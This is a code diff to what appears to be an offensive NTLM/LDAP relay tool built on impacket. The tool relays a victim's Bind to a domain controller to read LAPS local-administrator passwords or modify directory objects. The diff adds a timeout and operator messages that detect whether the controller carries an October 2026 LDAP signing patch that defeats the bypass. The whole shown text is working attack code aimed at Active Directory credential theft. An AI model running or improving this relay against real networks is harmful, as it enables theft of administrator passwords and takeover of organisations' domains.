@@ -33,6 +33,7 @@ import os
 import random
 import runpy
 import shutil
+import socket
 import struct
 import sys
 import time
@@ -515,56 +516,95 @@ class CrossUserLDAPRelayClient(ldaprelayclient.LDAPSRelayClient):
         # The DC may pack Bind + operation responses into a single SASL record
         # or split them across records; we handle both by looping until we see
         # modifyResponse or searchResDone.
+        #
+        # IMPORTANT: We add a socket timeout. A patched DC (October 2026 LDAP
+        # signing fix, KB for Server 2016-2025) will accept the victim Bind
+        # (the bind itself is properly signed with the attacker's session key)
+        # but silently drop the second LDAP message in the SASL record because
+        # its signature no longer matches the post-bind session key. The
+        # connection stays open and the script would hang forever without a
+        # timeout. If we time out waiting for the next record, that is a
+        # strong signal the DC is patched.
         laps_results = {}
         final_seen = False
-        while not final_seen:
-            try:
-                length = struct.unpack(">I", read_exact(self.raw._socket, 4))[0]
-                plaintext = self.raw.decrypt(struct.pack(">I", length)
-                                             + read_exact(self.raw._socket, length))
-            except Exception as error:
-                print(f"[!] response unavailable: {type(error).__name__}: {error}", flush=True)
-                break
+        bind_seen = False
 
-            remainder = plaintext
-            while remainder:
+        original_timeout = self.raw._socket.gettimeout()
+        self.raw._socket.settimeout(15)  # 15s grace for the next SASL record
+        try:
+            while not final_seen:
                 try:
-                    # Decode with LDAPMessage as the spec so the protocolOp CHOICE
-                    # is recognised; subsequent getComponent() picks the right
-                    # alternative (bindResponse / searchResEntry / searchResDone /
-                    # modifyResponse).
-                    message, remainder = decoder.decode(remainder, asn1Spec=LDAPMessage())
+                    length_bytes = read_exact(self.raw._socket, 4)
+                    length = struct.unpack(">I", length_bytes)[0]
+                    body = read_exact(self.raw._socket, length)
+                    plaintext = self.raw.decrypt(struct.pack(">I", length) + body)
+                except socket.timeout:
+                    if bind_seen:
+                        print(f"[!] timed out waiting for the operation response "
+                              f"after Bind succeeded", flush=True)
+                        print(f"[!] the DC accepted the victim Bind but is not "
+                              f"sending a response to the {op_label}", flush=True)
+                        print(f"[!] this is the textbook signature of the October "
+                              f"2026 LDAP signing patch (or Server 2025 24H2 "
+                              f"hardening): the second LDAP message in our SASL "
+                              f"record is being silently dropped because its "
+                              f"signature no longer matches the post-bind "
+                              f"session key.", flush=True)
+                        print(f"[!] check: Get-HotFix | Where-Object "
+                              f"{{$_.InstalledOn -gt (Get-Date '2026-10-01')}}  "
+                              f"-- if you see KB items from Oct 2026+, the DC "
+                              f"is patched and the bypass will not work.", flush=True)
+                    else:
+                        print(f"[!] timed out waiting for any response from the DC "
+                              f"(no Bind response either)", flush=True)
+                    break
                 except Exception as error:
-                    print(f"[!] ASN.1 decode failed: {type(error).__name__}: {error}",
+                    print(f"[!] response unavailable: {type(error).__name__}: {error}",
                           flush=True)
                     break
 
-                # getName() must be called on the CHOICE (protocolOp), not on the
-                # already-resolved component (BindResponse / searchResEntry / ...).
-                # The resolved components are Sequence subclasses without getName().
-                protocol_op = message["protocolOp"]
-                name = protocol_op.getName()
-                op = protocol_op.getComponent()
+                remainder = plaintext
+                while remainder:
+                    try:
+                        # Decode with LDAPMessage as the spec so the protocolOp CHOICE
+                        # is recognised; subsequent getComponent() picks the right
+                        # alternative (bindResponse / searchResEntry / searchResDone /
+                        # modifyResponse).
+                        message, remainder = decoder.decode(remainder, asn1Spec=LDAPMessage())
+                    except Exception as error:
+                        print(f"[!] ASN.1 decode failed: {type(error).__name__}: {error}",
+                              flush=True)
+                        break
 
-                if name == "bindResponse":
-                    print(f"[+]   Bind -> {op['resultCode'].prettyPrint()} "
-                          f"{bytes(op['diagnosticMessage']).decode(errors='replace')[:80]}",
-                          flush=True)
-                elif name == "searchResEntry":
-                    for partial in op["attributes"]:
-                        attr_name = str(partial["type"])
-                        for val in partial["vals"]:
-                            laps_results.setdefault(attr_name, []).append(val.asOctets())
-                elif name == "searchResDone":
-                    final_seen = True
-                    print(f"[+]   SearchDone -> {op['resultCode'].prettyPrint()} "
-                          f"{bytes(op['diagnosticMessage']).decode(errors='replace')[:80]}",
-                          flush=True)
-                elif name == "modifyResponse":
-                    final_seen = True
-                    print(f"[+]   Modify -> {op['resultCode'].prettyPrint()} "
-                          f"{bytes(op['diagnosticMessage']).decode(errors='replace')[:80]}",
-                          flush=True)
+                    # getName() must be called on the CHOICE (protocolOp), not on the
+                    # already-resolved component (BindResponse / searchResEntry / ...).
+                    # The resolved components are Sequence subclasses without getName().
+                    protocol_op = message["protocolOp"]
+                    name = protocol_op.getName()
+                    op = protocol_op.getComponent()
+
+                    if name == "bindResponse":
+                        bind_seen = True
+                        print(f"[+]   Bind -> {op['resultCode'].prettyPrint()} "
+                              f"{bytes(op['diagnosticMessage']).decode(errors='replace')[:80]}",
+                              flush=True)
+                    elif name == "searchResEntry":
+                        for partial in op["attributes"]:
+                            attr_name = str(partial["type"])
+                            for val in partial["vals"]:
+                                laps_results.setdefault(attr_name, []).append(val.asOctets())
+                    elif name == "searchResDone":
+                        final_seen = True
+                        print(f"[+]   SearchDone -> {op['resultCode'].prettyPrint()} "
+                              f"{bytes(op['diagnosticMessage']).decode(errors='replace')[:80]}",
+                              flush=True)
+                    elif name == "modifyResponse":
+                        final_seen = True
+                        print(f"[+]   Modify -> {op['resultCode'].prettyPrint()} "
+                              f"{bytes(op['diagnosticMessage']).decode(errors='replace')[:80]}",
+                              flush=True)
+        finally:
+            self.raw._socket.settimeout(original_timeout)
 
         if is_read:
             if laps_results:
